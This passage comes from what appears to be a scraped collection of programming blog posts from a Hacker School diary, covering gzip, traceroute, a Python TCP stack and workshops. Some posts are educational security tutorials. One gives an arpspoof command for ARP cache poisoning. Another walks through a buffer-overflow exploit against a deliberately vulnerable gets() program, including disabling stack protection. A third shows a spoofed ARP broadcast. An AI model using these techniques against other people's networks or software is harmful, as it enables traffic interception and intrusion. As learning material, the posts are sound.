handle on which parts of the code I’m confident and\nwhich parts are more likely to be broken. \n\n There is also a whole book on how to test when testing is hard called\n Working Effectively With Legacy Code .\nI’ve read a little of it and it is pretty great. The chapter titles are\nlike “I Don’t Have Much Time and I Have to Change It” and “I Need To\nChange A Monster Method And I Can’t Write Tests For It”. \n\n Pretty much all the situations it describes are less tractable than my\ngzip situation, so I pretty much have no excuses :) \n"},
{"url": "https://jvns.ca/blog/2013/10/16/day-10-goals/", "title": "Day 10: Goals. Goals? Maybe I need to be *reading* more code?", "content": "\n      Today I learned a bit of Clojure, and learned about a Julia plotting library\ncalled  Gadfly.jl \nBut it didn’t feel super productive, and now I’m thinking a bit about\nwhat my goals for Hacker School are. I think they’re something like: \n\n \n Contribute to open source projects! This is happening. \n Write a non-trivial piece of software from scratch that I feel good\nabout the design of. This is not happening at all. Still\nhunting for something which is the right size and which I can care\nabout enough to do it. \n Feel better about my ability to design good code. Also not happening\nyet. \n Learn about concurrency, because I don’t even. \n Learn about how to write practical functional programs.\n \n \n\n To address #3, I think I need to spend more time reading well-written\ncode. I’m still not sure about #2. Or #4. Or #5. \n\n So far the things that have taught me the most were: \n\n \n doing a bit of async programming \n Learning about how Python bytecode works \n \n\n Maybe writing a Javascript interpreter would be a fun way to address\nnumbers 2, 3, and 4? \n"},
{"url": "https://jvns.ca/blog/2013/10/31/day-20-scapy-and-traceroute/", "title": "Day 20: Traceroute in 15 lines of code using Scapy", "content": "\n      Today Jari and Brian explained a whole bunch of things to me about networks!\nIt was fantastic. It’s amazing to have people with so much experience to ask\nquestions. \n\n At the end they mentioned that I should look up how  traceroute  works and\nthat it’s a pretty popular networking-job-interview question. And I’d just\ndiscovered this super cool Python networking library called\n Scapy  which lets you construct\npackets really easily. So I thought I’d implement traceroute using scapy! \n\n I thought it would take a long time, but turns out that (a basic version) is\nreally easy. \n\n So using scapy, you can create IP and UDP packets like this: \n\n from scapy.all import *\nip_packet = IP(dst=\"hackerschool.com\", ttl=10)\nudp_packet = UDP(dport=40000)\nfull_packet = IP(dst=\"hackerschool.com\", ttl=10) / UDP(dport=40000)\n \n\n Then you can send a packet like this: \n\n \nsend(full_packet)\n \n\n So IP packets have a  ttl  attribute, which stands for “Time-To-Live”. Every\ntime a machine receives an IP packet, it decreases the  ttl  by 1 and passes\nit on. Basically this is a super smart way to make sure that packets don’t get\ninto infinite loops. \n\n If a packet’s  ttl  runs out before it replies, the last machine sends back an\nICMP packet saying “sorry, failed!”. \n\n To implement traceroute, we send out a UDP packet with  ttl=i  for  i =\n1,2,3,... . Then we look at the reply packet and see if it’s a “Time ran out”\nor “That port doesn’t exist” error message. In the first case, we keep going,\nand in the second case we’re done. \n\n Here’s the code! It’s 16 lines including comments and everything. \n\n from scapy.all import *\nhostname = \"google.com\"\nfor i in range(1, 28):\n    pkt = IP(dst=hostname, ttl=i) / UDP(dport=33434)\n    # Send the packet and get a reply\n    reply = sr1(pkt, verbose=0)\n    if reply is None:\n        # No reply =(\n        break\n    elif reply.type == 3:\n        # We've reached our destination\n        print \"Done!\", reply.src\n        break\n    else:\n        # We're in the middle somewhere\n        print \"%d hops away: \" % i , reply.src\n \n\n The output looks like: \n\n \n \n1 hops away:  192.168.1.1\n2 hops away:  24.103.20.129\n3 hops away:  184.152.112.73\n4 hops away:  184.152.112.73\n5 hops away:  107.14.19.22\n...\n \n \n\n So it turns out traceroute is kind of easy! Apparently the difference between\ntraceroute on Windows and Unix is that Unix generally sends UDP packets and\nWindows sends ICMP packets. \n\n There’s also  tcptraceroute  which, well, sends TCP packets. \n\n"},
{"url": "https://jvns.ca/blog/2013/10/29/day-18-in-ur-connection/", "title": "Day 18: ARP cache poisoning (or: In ur connection, sniffing ur packets)", "content": "\n      Today I learned how to steal packets on a wireless network! If you want to try\nthis one at home, you’ll need \n\n \n dsniff  (in the Ubuntu repositories) \n Wireshark \n At least 2 devices on a network (like a smartphone and a computer) \n \n\n This finally pretty much only involved one line of code. Here it is: \n\n    $ sudo arpspoof -i wlan0 -t 192.168.0.13 192.168.0.1  \n\n Okay, so what does this even mean, right? \n\n 192.168.0.13  is my phone’s IP address on the local network.\n 192.168.0.1  is the address of the router. \n\n What this line basically does is “Hey phone! You want to send a packet to the\nrouter? Send that to me instead. Thanks!” \n\n This exploitation technique is called “ARP cache poisoning”. Apparently when\nmy computer needs to communicate with an IP address (like 192.168.1.68), it\n actually  needs to look up the MAC address for that IP address and send\npackets to the MAC address. If it needs to send packets to the outside world\nit sends them to its router first, so it needs the router’s MAC address. \n\n Here’s what a normal asking-for-MAC-address exchange looks like, in Wireshark: \n\n \n\n That image is a bit small, but you can click on it to enlarge it. \n\n So the conversation goes: \n\n \n Computer  (to everyone on the network) “Who is 192.168.0.13” \n Phone  (to computer) “I am! My MAC address is  38:e7:d8:64:42:b7 “ \n Phone  (to computer) What is your MAC address? \n Computer  (to phone) My MAC address is  60:67:20:eb:7b:bc \n \n\n And then the phone and the computer remember which MAC address to use and\ncommunicate with each other that way. \n\n (aside: My ethernet card and wireless card actually have different MAC\naddresses, so it’s not exactly a  machine  that has a MAC address, it’s the\nNIC. I think.) \n\n So the deal with MAC address spoofing is: it turns out ANYONE can go ahead and tell my phone \n\n “I am! My MAC address is  aa:bb::cc::dd::ee::ff “ \n\n and my phone will just go ahead and believe them. But it gets better! It’s not\n just  that anyone can reply, they can reply  even if the phone didn’t ask for\na MAC address . So if my phone has the  right  MAC address for my computer,\nsomeone else can go ahead and tell them “The MAC address for  192.168.0.15  is\n aa:bb:cc:dd:ee:ff ”. \n\n And my phone will just think “Sweet. Thanks for the update!”. It’ll eventually\nfix itself up, so you have to keep sending it these messages over and over\nagain to keep the cache poisoned. \n\n So let’s look at what that  arpspoof  command from before is doing in\nWireshark: \n\n \n\n You can see that every 2 seconds or so my computer ( IntelCor_eb:7b:bc ) is\ntelling my phone ( Htc_64:42:b7 ) the wrong MAC address for the router\n( 10.0.0.1 ) \n\n And that’s what  arpspoof  does! It actually tries to do it both ways (so the\nrouter and the phone will both communicate with me instead of each other), but\nI think the router doesn’t take as much bullshit so it doesn’t work. \n\n It also doesn’t appear to work on my Linux computer, but it seemed to work on\nKate’s Macbook Pro. If you try to poison your cache on a Unixy machine, you\ncan find out if it worked by running  arp -na  and seeing if the MAC addresses\nare right. \n\n I learned all this stuff from  Hacking: The Art of Exploitation .\nIt is fantastic. You can also download the LiveCD from the website for free\nand it has all the tools I mentioned here. \n\n I paired on this with  Kate  a lot. \n\n"},
{"url": "https://jvns.ca/blog/2013/10/23/day-15-how-gzip-works/", "title": "Day 15: How a .gz file is structured, redux", "content": "\n      So I’ve finished implementing gunzip in Julia! I paired with a lot of\nwonderful people along the way, so I ended up trying to explain how the file\nformat works a lot of times, probably often in a fairly confused way (sorry!).\nHere is another disorganized attempt at explaining gzip, mainly for my own\nbenefit. \n\n The basic idea behind gzip (aka the DEFLATE algorithm) is that there are 2 passes: \n\n \n LL87 pass: Replace repeated sequences with pointers to where they appeared\npreviously in the text. There is a good diagram of this at the beginning of\n this page \n Huffman coding pass: Use Huffman coding to represent the text and pointers in an efficient way \n \n\n There is a pretty good explanation of what Huffman coding is on the\n aforementioned page , so I’m\njust going to go ahead and talk about the gzip file format. Probably this will\nmake no sense if you have not been absorbed in gzip for the last 5 days. \n\n That said, here is how a gzip file is laid out, and some of the code I wrote to\ndecode it. The github repository is here:  github.com/jvns/gzip.jl \n\n \n\n Gzip headers and metadata (20 bytes or so) \n\n This part of the file isn’t that interesting. Every gzip file has to start\nwith the magic bits  1F86 . There is a 9 byte header, followed by some\nvariable length metadata, which includes the filename and some other stuff.\nI am not sure why the filename is included in the metadata! \n\n Apparently gunzip also knows how to deflate some other legacy compression\nformat, but for our purposes  compression_method  is always  8 . \n\n Here are the Julia data structures I used to store the header & metadata: \n\n type GzipHeader\n  id::Vector{Uint8} # length 2\n  compression_method::Uint8\n  flags::GzipFlags\n  mtime::Vector{Uint8} # length 4\n  extra_flags::Uint8\n  os::Uint8\nend\n \n\n type GzipMetadata\n  header::GzipHeader\n  xlen::Uint16\n  extra::ASCIIString\n  fname::ASCIIString\n  fcomment::ASCIIString\n  crc16::Uint16\nend\n \n\n Blocks! \n\n The rest of the gzip file after the headers and metadata is a series of\nblocks, to be read in order. As far as I can tell it is impossible to\ndecompress gzip files in parallel – there’s no way to know when a block\nhas ended without fully decompressing it. \n\n Block header (3 bits) \n\n Each block starts with 3 bits indicating \n\n \n Whether this block is the last block (1 bit) \n How the block is compressed (2 bits). My gunzip only supports one compression method,\nthough one of the options is “not compressed”, so that would be easy to add. \n \n\n Header for the Huffman codes (14 bits) \n\n There is a recursive thing going on where there is a Huffman tree encoded with\nanother Huffman tree. This header is the metadata that helps you get started\nwith reading all these trees. \n\n \n hclen  is the number of codes in the first tree (minus four) \n hlit : the number of ‘literal codes’ in the second tree \n hdist : the number of ‘distance codes’ (minus one) in the second tree \n \n\n This minus four and minus one business basically drove me insane. But they are\neasy to represent at least: \n\n type HuffmanHeader\n    hlit::Uint8\n    hdist::Uint8\n    hclen::Uint8\nend\n \n\n Code lengths for first Huffman tree ( (hclen + 4) * 3  bits) \n\n Next, there is a series of numbers from 0 to 7 which you can use to put\ntogether a Huffman tree. I read these in  read_first_tree() . \n\n Code lengths for second Huffman tree (unknown number of bits) \n\n The second Huffman tree’s code lengths are encoded using the first Huffman tree. \n\n So you have to read  (258 + hlit + hdist)  code lengths, using the first\nHuffman tree as your guide. I read these in  read_second_tree_codes() \n\n You actually end up with two Huffman trees here – they’re called\n literal_tree  and  distance_tree .   literal_tree  is made from the first\n 257 + hlit  codes, and  distance_tree  is made from the next  hdist + 1 \ncodes. This was really not obvious and took me forever to figure out. \n\n The compressed data! (unknown number of bits) \n\n To read the compressed data, you have to \n\n \n Read a code\n\n \n If it’s the stop code, stop! \n If it represents a literal character (like ‘a’ or ‘2’), just add it to the decoded text \n If it instead represents a pointer to some previous text, figure out the length and the relative distance and copy the text. \n \n \n\n Here is the actual code I wrote to do this! \n\n function inflate_block!(decoded_text, bs::BitStream, literal_tree::HuffmanTree, distance_tree::HuffmanTree)\n    while true\n    \t# Read a code from the file\n        code = read_huffman_bits(bs, literal_tree)\n        if code == 256 # Stop code; end of block!\n            break\n        end\n        if code <= 255 # ASCII character\n            append!(decoded_text, [convert(Uint8, code)])\n        else # Pointer to previous text\n            len = read_length_code(bs, code)\n            distance = read_distance_code(bs, distance_tree)\n            # Copy the previous text into our decoded text\n            copy_text!(decoded_text, distance, len)\n        end\n    end\n    return decoded_text\nend\n \n\n Main function for reading a block! \n\n And here’s the main block-reading function! It does a lot of things, but it\ncame out in (I thought) a fairly readable way. \n\n It modifies  decoded_text  in place because it turns out that blocks can refer\nto text in previous blocks. So there needs to be some shared state. \n\n function inflate_block!(decoded_text, bs::BitStream)\n    head = read(bs, HuffmanHeader)\n    \n    # Read the first Huffman tree\n    first_tree = read_first_tree(bs, head.hclen)\n\n    # Read the codes for the second Huffman tree\n    codes = read_second_tree_codes(bs, head, first_tree)\n    \n    # Put together the tree of literals (0 - 255), stop code (256), and length codes (257-285ish)\n    literal_codes = codes[1:257 + head.hlit]\n    lit_code_table = create_code_table(literal_codes, [0:length(literal_codes)-1])\n    literal_tree = create_huffman_tree(lit_code_table)\n    \n    # Put together the tree of distance codes (0-17)\n    distance_codes = codes[end-head.hdist:end]\n    dist_code_table = create_code_table(distance_codes, [0:length(distance_codes)-1])\n    distance_tree = create_huffman_tree(dist_code_table)\n    \n    return inflate_block!(decoded_text, bs, literal_tree, distance_tree)\nend\n \n"},
{"url": "https://jvns.ca/blog/2013/10/24/do-rails-programmers-use-node-visualizing-correlations-in-command-usage/", "title": "Do Rails programmers use node.js? Visualizing correlations in command usage", "content": "\n      \n\n A few months ago I got curious about which unix command line utilities were\nthe most popular, so I ran a survey on Hacker News. I ended up getting 1,500\nresponses or so. \n\n Once I had that, I wanted to know how commands are related to each other: do\npeople who use  gcc  use  python ? What about  scala  and  clojure ? \n\n So I made a visualization to explore this question! It shows a graph where commands which\nare strongly correlated together are linked (for example  ruby  and  rails ). \n\n You can look at it here .\nI enjoy it a lot, especially the part of the graph around  gcc , because it’s\npretty sparse. Try clicking ‘See the whole graph’; it’s beautiful. Just do it in\nChrome, not Firefox. \n\n"},
{"url": "https://jvns.ca/blog/2013/10/31/day-19-i-might-understand-why-networking-is-hard/", "title": "Day 19: A few reasons why networking is hard", "content": "\n      So I’ve been trying to learn how to do a particular network exploit this week\n(hijack my phone’s internet so that it replaces every webpage with a pony),\ninspired by Jessica McKellar’s\n How the Internet Works \ntalk (skip to the end to see what I’m talking about). \n\n For a long time I’ve had the notion that networking is pretty complicated, but\nI didn’t really know why that was. Yesterday I learned a few reasons why! I\nspent pretty much the whole day being confused. \n\n I started trying to understand how iptables works, since that was one step in\nthe pony-hacking explanation. \n\n Some things I looked at \n\n \n This extremely long IPTables tutorial \n IPTablesHowTo  from Ubuntu’s community wiki \n A set of web server benchmarks , via  @pphaneuf \n \n\n It turns out iptables is pretty complicated. The extremely long iptables\ntutorial above was actually quite helpful, though – it goes into tons of\ndetail about how TCP and IP work. It is an avalanche of information and way\ntoo much to actually absorb, but it is very useful to know that there is that\nmuch stuff that exists to know. \n\n A choice quote from  the tutorial : \n\n \nAmong other things, bit [6-7] are specified to be set to 0. In the ECN updates\n(RFC 3168, we start using these reserved bits and hence set other values than\n0 to these bits. But a lot of old firewalls and routers have built in checks\nlooking if these bits are set to 1, and if the packets do, the packet is\ndiscarded. Today, this is clearly a violation of RFC's, but there is not much\nyou can do about it, except to complain.\n \n\n So one part of “networking is complicated” is “The protocols change over time\nand sometimes implementations don’t keep up”. \n\n In the  set of web server benchmarks , many of the web servers take at least  1 ⁄ 5 \nof a second per client to return a response, but some don’t. The webpage author explains why: \n\n \nTurns out the change that made the difference was sending the response headers\nand the first load of data as a single packet, instead of as two separate\npackets. Apparently this avoids triggering TCP's \"delayed ACK\", a 1/5th second\nwait to see if more packets are coming in. thttpd-2.01 has the single-packet\nchange.\n \n\n So another part of “networking is complicated” is that there are many\ndifferent levels (Ethernet, IP, TCP, …), and at higher levels the lower\nlevels are supposed to be more or less abstracted away. For example, a\nwebserver “shouldn’t” have to worry about the details of how TCP works. But\nthen it turns out that the details of how TCP works  do  matter sometimes. \n\n And there are a lot of levels of networking that could be causing problems, so\nwhen you’re doing high-performance networking stuff, well… it’s complicated. \n\n"},
{"url": "https://jvns.ca/blog/2013/10/28/day-17-buffer-overflows/", "title": "Day 17: How to write a buffer overflow exploit", "content": "\n      I’ve declared this week to be the week of networks & security. \n\n Today I started reading the excellent book\n Hacking: The Art of Exploitation \nby Jon Erickson. I learned a lot about how different parts and how MAC address\nspoofing actually works. \n\n But! Buffer overflows! I worked with Travis and Daphne today and we made one\nwork! \n\n Okay. Here is a program with a vulnerability, made extra easy to exploit: \n\n #include <stdio.h>\n#include <string.h>\n\nchar password[] = \"super_secret\";\n\nvoid foo(void) {\n  printf(\"You hacked me! Here is the secret password: %s\\n\", password);\n  fflush(stdout);\n}\n\nint main(int argc, char *argv[]) {\n  char buf[4];\n\n  printf(\"Here is the address of foo: %p\\nWhat is your hacking text? \", foo);\n  fflush(stdout);\n\n  gets(buf);\n\n  printf(\"You entered: %s\\n\", buf);\n  fflush(stdout);\n\n  return 0;\n}\n \n\n The idea is that we’re going to put a string, then make the program jump to\nthe address of  foo  instead of returning. I couldn’t get this to work on my\n64-bit machine for some reason, so I told it to be 32-bit instead and it\nworked.  If you know why please tell me!   ( Edit:  Figured this out! Turns out I\njust needed to pad the address with 0s until it was 64 bits and then\nexperiment with offsets.) \n\n $ gcc -m32 test.c -o test\n$ perl -e 'print \"aaaa\" . \"\\x64\\x84\\x04\\x08\" x 4' | ./test\nHere is the address of foo: 0x80484b4\nWhat is your hacking text? You entered: aaaa���\n*** stack smashing detected ***: ./a.out terminated\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xf7663eb5]\n/lib/i386-linux-gnu/libc.so.6(+0x104e6a)[0xf7663e6a]\n./a.out[0x8048561]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xf75784d3]\n./a.out[0x8048421]\n \n\n Oh look! It turns out that gcc already knows about this exploit and has special built-in protections! We can disable those, though… \n\n $ gcc -fno-stack-protector -m32 test.c -o test\n$ perl -e 'print \"aaaa\" . \"\\x64\\x84\\x04\\x08\" x 4' | ./test\nHere is the address of foo: 0x8048464\nWhat is your hacking text? You entered: aaaadddd�\nYou hacked me! Here is the secret password: super_secret\n[1]    26357 done                              perl -e 'print \"aaaa\" . \"\\x64\\x84\\x04\\x08\" x 4' |\n \n       26358 segmentation fault (core dumped)  ./a.out\n \n\n BOOM. We win! \n\n What happened here? At the end of the stack, there’s the address that the\nfunction needs to jump back to when it returns. Since  gets  doesn’t know how\nmany characters to read into buf, it keeps reading into the stack until the\nstring is over and writes over that address. We don’t know exactly where the\naddress is, so we keep writing it over and over and over again until it works. \n\n Also! Notice how we had to reverse the order of the memory address to be\n \"\\x64\\x84\\x04\\x08\"  instead of  \\x08\\x04\\x84\\x64 . This is because memory is\nlaid out in a little-endian way. “Little-endian” basically means “backwards”.\nIntel architectures are always like this. See  wikipedia  for more on endianness. \n\n There are smarter ways to deal with this issue of not knowing where the end of\nthe stack is (“NOP sleds”!), but this one is simpler and so it is what we did. \n\n Filippo pointed out to me that NOP sleds are actually something you use in\nshellcode when you’re not sure where the program execution will start. In this\ncase I think you actually just have to figure out where the return address is.\nI think you can also use gdb or objdump to discover the layout of the stack,\nbut I don’t know how to do that yet. \n\n"},
{"url": "https://jvns.ca/blog/2013/10/24/day-16-gzip-plus-poetry-equals-awesome/", "title": "Day 16: gzip + poetry = awesome", "content": "\n      Gzip compresses by replacing text with pointers to earlier parts of the text.\nHere’s a visualization of what actually happens when you decompress “The\nRaven”. It highlights the bits of text that are copied from previously in the\npoem. \n\n I showed this as a Thursday talk at Hacker School today :) I really like how\nyou can see the rhyming inside the poem like (rapping… tapping) come out in\nthe compression algorithm. \n\n No sound, just gzip. \n\n You can try it out if you want by cloning\n https://github.com/jvns/gzip.jl  and\nchecking out the ‘visualization’ branch. \n\n Edit:  Thanks to a suggestion in the comments, here’s  the whole poem  and  Hamlet . \n\n \n\n Edit:  Some clarifications, for the interested: \n\n I implemented gunzip from scratch to learn how it works. This visualization is\na small hack on top of that, just adding some print and sleep statements. You can\nsee  the source code \nthat produces it. \n\n This in fact shows how LZ77 compression works, which is the first step of gzip\n(or DEFLATE) compression. The second step is Huffman coding and isn’t shown in\nthe video at all :). If you want to know more,\ntry this  excellent but very long page . \n\n"},
{"url": "https://jvns.ca/blog/2013/11/06/day-22-got-some-tcp-packets-back/", "title": "Day 22: Got some TCP packets back!", "content": "\n      I spent a bunch of time with  Jessica \ntrying to send TCP packets to get the\n http://example.com  homepage. \n\n It turned out that the problem we were having was not at the TCP level,\nbut actually at HTTP level: we needed to send something like \n\n example.com\\r\\nAccept: */*\\r\\n\\r\\n\"\n \n\n to make the server actually reply. I then successfully reassembled a\nbunch of TCP packets into a webpage! I still need to \n\n \n reply saying I got the packets (to the FIN-ACK, I think) \n Make sure I don’t use duplicate packets when I reassemble \n probably lots of things. \n \n\n Today wasn’t super productive, I think because I gave a talk at NYC\nPython and I was a bit worried about it. The talk went well, though! So\ntomorrow I will hopefully get more done. We will see! \n\n I really want to start writing “real” code again soon. Maybe tomorrow.\nThis exploratory networking stuff is super fun and I’m learning a lot,\nbut I feel like I haven’t written much code in a while and it is\nbothering me. Maybe a bittorrent client will come soon =) \n\n BUT WHICH LANGUAGE. Clojure? Hmm. \n\n"},
{"url": "https://jvns.ca/blog/2013/11/12/women-in-technology-workshop-at-pydata-nyc/", "title": "Women in Technology workshop at PyData NYC", "content": "\n      This year at PyData NYC, the lovely folks at NumFOCUS invited some of us Hacker\nSchoolers to run Python workshops for a group of high school girls from a few\ndifferent high schools. They had varying amounts of programming experience, so\nwe split them into beginner and advanced groups. We had a small army of\nvolunteers from JP Morgan, which helped a ton. \n\n Lea Albaugh , an amazing artist/designer/\nseamstress/programmer human who I’ve been lucky enough to hang out with at\nHacker School, led the beginner’s group. She taught basic concepts of\nprogramming (variables and conditionals) using  Ren’Py ,\na Python-based tool for making story games. The students implemented\ninteractive conversations, which they could add graphics and sound to later. \n\n With the advanced group, I ran a workshop on how to use Python for data\nanalysis. They all downloaded some  open data about 311 calls  from NYC open\ndata and used it to explore questions like: \n\n \n how many complaints there are in their ZIP code \n which borough complains the most about rats \n whether there are more complaints in parks or about helicopters \n \n\n The girls did a fantastic job of exploring. We did a lot of exercises like\n“change the colour of the map to orange!” and “replace my zip code with your\nzip code!“, and they seemed to really enjoy seeing data from near their houses\nand comparing who had the most complaints in their neighborhood. In particular,\none person found that someone had been complaining about “Unsanitary Pigeon\nConditions” near their house. \n\n The colour-changing was more exciting than I expected – they got pretty into\ninvestigating which colours matplotlib knew about, and were really impressed. \n\n I tried to work more on making sure they had a good time than making them\nLearn the Maximum Amount of Things, and I think that went pretty well. \n\n Here are the  materials for the data analysis workshop . \n\n After the workshop, there was a fun talk from Peter Wang of Continuum\nAnalytics who demoed a really fun Python-based tool that he built that lets you\nvisualize sound waves in real time. He then happened to mention that it looks\nespecially awesome with violin music, and someone happened to have a violin,\nso they tried it! \n\n Kate  also talked about  Riskee Ball ,\na fire arts project she worked on, and  Katie  demoed her\n Harry Potter text adventure . \n\n After lunch, there was a panel! There was  Celia La  who makes\neducational technology,  Olga Botvinnik , a PhD student in bioinformatics,\nmy co-hacker-schooler Kat, and a couple of people from JP Morgan. It was\nreally neat to hear about how everyone got started with programming – one\nperson said she studied music and then started programming later, and someone\nelse said she  wanted  to study music, but her parents made her do\nsomething more practical and she ended up enjoying programming :) \n\n I am always amazed by how cool the programmer women I meet are. It was a fun time. \n\n Thanks to Katie Silverio,  Kate Murphy , Katerina Barone-Adesi,\n Karissa McKelvey ,  Olga Botvinnik ,\nRebecca Bainbridge, and all the volunteers from JP Morgan for all the help!\nAnd Leah Silen from NumFOCUS put all this together. =D \n\n"},
{"url": "https://jvns.ca/blog/2013/11/06/day-23-started-writing-a-socket-library/", "title": "Day 23: Started writing a TCP stack in Python", "content": "\n      For the last couple of days I’ve been trying to understand how TCP\nworks, because networking is really fun. Yesterday I realized that I\nreally hadn’t been writing as much code as I want to be, though. \n\n So I’ve started working on a mini TCP stack! I’m not sure yet how far\nthis will go, but so far I’m running into tons of problems, so I think\nthis might be a good choice. \n\n The code so far is at\n https://github.com/jvns/teeceepee . \n\n Here are the parameters: \n\n \n Built on top of  scapy , so I\ndon’t have to actually know how the bits of a TCP packet are put\ntogether \n I do, however, need to use raw sockets in order to be able to send TCP\npackets, so everything has to run as root \n \n\n So far I have \n\n \n A  TCPSocket  class, which manages connections to servers and keeps some\nstate. Right now my states are  CLOSED ,  SYN-SENT , and\n ESTABLISHED . I’m using  this diagram \nas a reference. \n A  TCPListener  class, which is responsible for managing all the\nsockets that might be open. Basically it has a dictionary that maps\nports to  TCPSocket  instances. I have no idea if this is actually how\nsocket libraries work. \n \n\n There’s a thread that listens for packets that are coming in and sends\nthem off to the appropriate  TCPSocket  instance for handling, using the\n dispatch  method. This is my first time using threads pretty much ever.\nExpecting all the problems. The listener thread starts when I import the\n tcp  module and ends when the program importing it ends. \n\n Right now I can \n\n \n establish a connection (send a TCP handshake) \n send some data (but not parse the response) \n \n\n Tomorrow I’m hoping to be able to tear down a connection properly and\nassemble the packets I’m receiving into some actual data. \n\n One of the things that is the most challenging so far is that I keep\nstarting and stopping the library, so there are all kinds of connections\nthat just die. Also I think the servers I’m interacting with think I’m\nunreliable, so sometimes they send me packets slowly. \n\n"},
{"url": "https://jvns.ca/blog/2013/11/06/nyc-python-talk-slides/", "title": "NYC Python talk", "content": "\n      I gave a talk at NYC Python today on how to use IPython Notebook, with\nthe 311 calls dataset from NYC Open Data as an example. We talked about\nwhich borough complains the most about rats (the Bronx) and which days\nof the week have the most noise complaints (Saturday, Sunday). \n\n It was a fun time! Here is the notebook, if you want to try it out\nyourself:  bit.ly/nyc-python-pandas \n\n"},
{"url": "https://jvns.ca/blog/2013/11/15/day-28-more-git-workflow-pictures/", "title": "Day 28: Made a git workflow visualization webapp!", "content": "\n      Yesterday and today I made the Git pictures from Wednesday’s post into a\nwebsite! \n\n How it works: You tell it the sequence of git commands you’ve ever\nexecuted. It gives you back pretty pictures. Like this fantastic picture\nof  Selena Deckelmann ’s workflow! I\nreally like how this one makes it clear when you’d want to use rebase\n(in between commit and push), or stash (before checkout and pull). It\nis a thing of beauty. \n\n You can make your own at\n https://visualize-your-git.herokuapp.com . \n\n \n\n"},
{"url": "https://jvns.ca/blog/2013/11/05/day-21-trying-to-tcp/", "title": "Day 21: Trying to TCP", "content": "\n      Today I started trying to write a TCP stack. In Python. We will see if\nthis is a good idea. \n\n I’m using  scapy . I talked\nabout scapy on\n Thursday \n– it’s a great tool for playing with low-level networking stuff in\nPython. \n\n So. I’ve gotten a TCP handshake working. The way this goes is you send a\nSYN, then get back a SYN-ACK, then send an ACK. \n\n I tried this TCP handshake code first: \n\n dest = \"google.com\"\nsource_port += 1 # We need to set a different source port every time\nip_header = IP(dst=dest)\nans = sr1(ip_header / TCP(dport=80, flags=\"S\", seq=random.randint(0, 1000))) # Send SYN, receive SYN-ACK\nreply = ip_header / TCP(dport=80, seq=ans.ack, ack = ans.seq + 1, flags=\"A\") # ACK\nsend(reply) # Send ACK\n \n\n This did NOT WORK. Upon inspecting Wireshark, it turned out that  my  machine\nwas the problem: it was sending out a RST (reset) packet after I got a SYN-ACK\npacket back from Google. What’s up with that? \n\n Well, I already have a network stack on my machine, and it was like “what’s\nthis SYN-ACK packet? I didn’t ask for this!“. So it would just reset the\nconnection. \n\n Jari (who is amazing) suggested a workaround: set up a fake IP address and\ntell the router using ARP\n( previously ) that\nI am the person with that IP address. Here’s the fixed version: \n\n I think I could also use iptables here to tell the kernel to ignore those\npackets. But I’m currently afraid of iptables. So. This code worked much\nbetter! \n\n # Set port & MAC address\nFAKE_IP = \"10.0.4.4\" # Use something that nobody else is going to have\nMAC_ADDR = \"60:67:20:eb:7b:bc\" # My actual MAC address\n\n# Broadcast our fake IP address\nsrp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(psrc=FAKE_IP, hwsrc=MAC_ADDR))\n\nsource_port += 1\nip_header = IP(dst=dest, src=FAKE_IP) # Set the source port to \nans = sr1(ip_header / TCP(dport=80, sport=source_port,  flags=\"S\", seq=random.randint(0, 1000))) # SYN\n# ans is the SYN-ACK\nreply = ip_header / TCP(dport=80, sport=source_port, seq=ans.ack, ack = ans.seq + 1, flags=\"A\") # ACK\nsend(reply) # Send ACK\npkt = ip_header / TCP(dport=80, sport=source_port, seq=reply.seq, flags=\"AP\") / \"GET / HTTP/1.1\\r\\n\\r\\n\" # Send our real packet\nsend(pkt)\n \n\n That is my small amount of code for the day. I also spend a ton of time reading\n the UDP handling code from the 4.4BSD network stack .\nI do not yet have anything intelligent to say about that, but it’s pretty interesting. \n\n"},
{"url": "https://jvns.ca/blog/2013/11/12/day-26-trying-to-describe-the-tcp-state-machine/", "title": "Day 26: Trying to describe the TCP state machine in a readable way. Failing.", "content": "\n      Today I made a bunch of progress (I can now be a TCP server, kinda!), but I want to\ntalk about problems instead. \n\n The main function right now in this TCP stack is called  handle() , and\nit’s responsible for moving from one part of the\n state machine \nto another. \n\n In particular, it has to \n\n \n Drop inappropriate packets \n Increment the current ACK number \n Make state transitions \n Send out ACKs and SYNs and FINs and FIN-ACKs when appropriate \n \n\n It is kind of a mess and I am finding it pretty hard to reason about and\ntest. \n\n Yesterday it looked like this: \n\n def handle(self, packet):\n    # Update our state to indicate that we've received the packet\n    self.ack = max(self.next_seq(packet), self.ack)\n    if hasattr(packet, 'load'):\n        self.recv_buffer += packet.load\n\n    recv_flags = packet.sprintf(\"%TCP.flags%\")\n    send_flags = \"\"\n\n    # Handle all the cases for self.state explicitly\n    if self.state == \"ESTABLISHED\" and 'F' in recv_flags:\n        send_flags = \"F\"\n        self.state = \"TIME-WAIT\"\n    elif self.state == \"ESTABLISHED\":\n        pass\n    elif self.state == \"SYN-SENT\":\n        self.seq += 1\n        self.state = \"ESTABLISHED\"\n    elif self.state == \"FIN-WAIT-1\" and 'F' in recv_flags:\n        self.seq += 1\n        self.state = \"TIME-WAIT\"\n    else:\n        raise BadPacketError(\"Oh no!\")\n\n    self._send_ack(flags=send_flags)\n \n\n In particular, I thought this  _send_ack()  call at the end was a great idea,\nbecause you always want to send an ACK! Except when you don’t! \n\n In fact, I have just remembered that my primary insight from yesterday was that\nI always wanted to send an ACK. But it turns out that actually there are a\ncouple of of cases where you  don’t  want to send an ACK: \n\n \n The packet you’re receiving was itself an ACK \n You’ve just received a RST packet and are closing the connection \n \n\n and then I found the  _send_ack()  call at the bottom confusing, because it\nwasn’t clear under what conditions the code actually go there. \n\n So now I have, after some suggestions from Allison: \n\n def handle(self, packet):\n    if self.last_ack_sent and self.last_ack_sent != packet.seq:\n        # We're not in a place to receive this packet. Drop it.\n        return\n\n    self.last_ack_sent = max(self.next_seq(packet), self.last_ack_sent)\n\n    recv_flags = packet.sprintf(\"%TCP.flags%\")\n\n    # Handle all the cases for self.state explicitly\n    if self._has_load(packet):\n        self.recv_buffer += packet.load\n        self._send_ack()\n    elif \"R\" in recv_flags:\n        self._close()\n    elif \"S\" in recv_flags:\n        if self.state == \"LISTEN\":\n            self.state = \"SYN-RECEIVED\"\n            self._set_dest(packet.payload.src, packet.sport)\n            self._send_ack(flags=\"S\")\n        elif self.state == \"SYN-SENT\":\n            self.seq += 1\n            self.state = \"ESTABLISHED\"\n            